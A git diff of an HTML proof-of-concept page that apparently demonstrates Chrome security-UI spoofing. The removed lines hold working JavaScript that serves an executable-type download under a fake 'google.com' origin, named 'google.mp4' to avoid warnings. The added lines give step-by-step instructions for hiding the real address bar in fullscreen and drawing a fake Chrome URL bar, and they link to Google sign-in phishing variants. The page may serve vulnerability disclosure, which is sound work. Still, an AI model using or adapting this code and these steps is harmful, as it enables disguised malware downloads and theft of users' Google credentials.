@@ -1,74 +1,102 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>POC - Download Origin Spoof</title>
-  <style>
-    body { font-family: Arial, sans-serif; background: #fff; padding: 40px 20px; text-align: center; }
-    h2 { color: #333; margin-bottom: 8px; }
-    .badge { display: inline-block; padding: 3px 10px; border-radius: 3px; font-size: 11px; background: #fee2e2; color: #dc2626; margin-bottom: 20px; }
-    input {
-      padding: 14px 20px; font-size: 16px; border: 2px solid #4285f4;
-      border-radius: 24px; width: 260px; text-align: center; cursor: pointer; outline: none;
-      -webkit-tap-highlight-color: transparent;
-    }
-    p { color: #666; font-size: 13px; margin-top: 12px; }
-    pre { background: #f5f5f5; padding: 12px; border-radius: 8px; font-size: 11px; text-align: left;
-          max-width: 500px; margin: 16px auto; overflow-x: auto; color: #666; line-height: 1.6; }
-    hr { border: none; border-top: 1px solid #eee; max-width: 400px; margin: 20px auto; }
-    a { color: #4285f4; text-decoration: none; font-size: 12px; }
-    a:hover { text-decoration: underline; }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Chrome Fullscreen UI Spoof - POC</title>
+<style>
+  body { font-family: Arial, sans-serif; background: #0a0a0f; color: #ddd; padding: 20px; }
+  .container { max-width: 620px; margin: 0 auto; }
+  h1 { font-size: 20px; color: #fff; }
+  h1 span { color: #ff4444; }
+  .badge { display: inline-block; padding: 3px 10px; border-radius: 3px; font-size: 11px; margin: 2px; }
+  .b-r { background: rgba(255,68,68,.15); color: #ff4444; }
+  .b-g { background: rgba(0,230,118,.15); color: #00e676; }
+  .card {
+    background: #14141e; border: 1px solid #222233;
+    border-radius: 10px; padding: 16px; margin-bottom: 14px;
+  }
+  .card h3 { font-size: 15px; color: #fff; margin-bottom: 8px; }
+  .card p { font-size: 12px; color: #888; line-height: 1.5; margin-bottom: 10px; }
+  .card a {
+    display: inline-block; padding: 10px 18px; margin: 3px;
+    border: 1px solid #444; border-radius: 6px; color: #ddd;
+    text-decoration: none; font-size: 13px;
+  }
+  .card a:hover { border-color: #ff4444; background: rgba(255,68,68,.06); }
+  .card a.primary { border-color: #ff4444; color: #ff4444; }
+  pre { background: #0d0d16; padding: 12px; border-radius: 6px; font-size: 11px; color: #888; overflow-x: auto; line-height: 1.5; }
+</style>
 </head>
 <body>
-  <h2>Download Origin Spoof POC</h2>
-  <span class="badge">Chrome Android/Desktop - Data URI Abuse</span>
+<div class="container">
 
-  <p><b>Tap the input below:</b></p>
+<h1>Chrome Fullscreen <span>UI Spoofing</span> POC</h1>
+<p style="color:#888;font-size:13px;margin-bottom:16px;">
+  <span class="badge b-r">Security UI Spoofing</span>
+  <span class="badge b-r">CWE-451</span>
+  <span class="badge b-g">Chrome Android/Desktop</span>
+</p>
 
-  <input type="text" id="trigger" placeholder="Tap here to trigger" readonly>
-
-  <p style="color:#888;font-size:12px;">
-    Opens Google → download appears with <b style="color:#ea4335">"google.com"</b> origin
+<div class="card">
+  <h3>Attack Summary</h3>
+  <p>
+    When a page enters <strong>fullscreen mode</strong>, the browser's URL bar and all
+    security indicators are <strong>completely hidden</strong>. The page can then draw
+    <strong>fake browser UI</strong> — a spoofed URL bar showing a trusted domain
+    (google.com) with a lock icon. The victim has <strong>no way to verify</strong>
+    the real URL without knowing the fullscreen exit gesture.
   </p>
+  <pre>
+┌─────────────────────────────┐
+│ 🔒 www.google.com      ⋮  │ ← FAKE URL bar (drawn by page)
+├─────────────────────────────┤
+│         Google              │ ← Real attacker page
+│   [malicious content]       │
+│                             │
+└─────────────────────────────┘
+  Actual URL (hidden): https://telojos11.github.io/jontro/...</pre>
+</div>
 
-  <hr>
+<div class="card">
+  <h3>POC Pages (tap to test on Android)</h3>
+  <a class="primary" href="fullscreen-spoof/fake-chrome.html">Fake Chrome Browser UI</a>
+  <a href="fullscreen-spoof/google-search.html">Google Search + Download</a>
+  <a href="fullscreen-spoof/google-login.html">Google Sign-In Phishing</a>
+</div>
 
-  <pre>Real page origin:  <span id="realOrigin"></span>
-Download shows:    <b style="color:#ea4335">data:https://google.com</b>
-
-The data: URI embeds a fake hostname.
-Chrome displays it as the download origin
-instead of the real page origin.</pre>
-
-  <hr>
-
-  <p style="font-size:12px;color:#888;">
-    Variants:
-    <a href="download-spoof/poc.html">Google Style</a> |
-    <a href="download-spoof/simple.html">Simple</a> |
-    <a href="download-spoof/poc-original.html">Original Replica</a> |
-    <a href="download-spoof/android-bypass.html">Android Bypass</a>
+<div class="card">
+  <h3>How It Works</h3>
+  <p>
+    1. <strong>Social engineering</strong> — page shows a fake prompt: "Google needs to open a secure session"
+    <br>2. User taps <strong>"Continue"</strong> → page enters fullscreen via <code>requestFullscreen()</code>
+    <br>3. <strong>Real URL bar disappears</strong> — browser chrome is hidden
+    <br>4. Page draws <strong>fake Chrome UI</strong> with spoofed URL + lock icon
+    <br>5. Victim sees "google.com" in the fake URL bar — trusts the page completely
+    <br>6. Phishing form / download / permission prompt follows
   </p>
+</div>
 
-  <script>
-    document.getElementById('realOrigin').textContent = window.location.hostname;
+<div class="card">
+  <h3>Why This Works on Android Chrome</h3>
+  <p>
+    • Fullscreen hides: URL bar, status bar, navigation buttons
+    <br>• Exit gesture (swipe from top) is <strong>not intuitive</strong> for most users
+    <br>• Fake browser UI is <strong>indistinguishable</strong> from real Chrome UI
+    <br>• Combined with a Google-lookalike page = <strong>perfect phishing</strong>
+    <br>• No patch exists — hiding UI is the <strong>intended behavior</strong> of fullscreen API
+  </p>
+</div>
 
-    document.getElementById('trigger').addEventListener('click', function() {
-      // Open Google in new tab
-      window.open('https://www.google.com', '_blank');
+<div class="card">
+  <h3>Variants Demonstrated</h3>
+  <p>
+    <b>Fake Chrome Browser:</b> Complete fake Android Chrome UI (status bar + URL bar + tabs)
+    <br><b>Google Search Spoof:</b> Fake search results + download prompt showing "from google.com"
+    <br><b>Google Sign-In:</b> Full Google login flow phishing with fake accounts.google.com URL
+  </p>
+</div>
 
-      // Download with spoofed origin (mp4 = no warning on Android)
-      setTimeout(function() {
-        var a = document.createElement('a');
-        a.href = 'data:https://google.com/' + ' '.repeat(200) + 'application/x-msdownload;base64,ZXN0dGVzdHRlc3R0ZXN0';
-        a.download = 'google.mp4';
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
-      }, 500);
-    });
-  </script>
+</div>
 </body>
 </html>
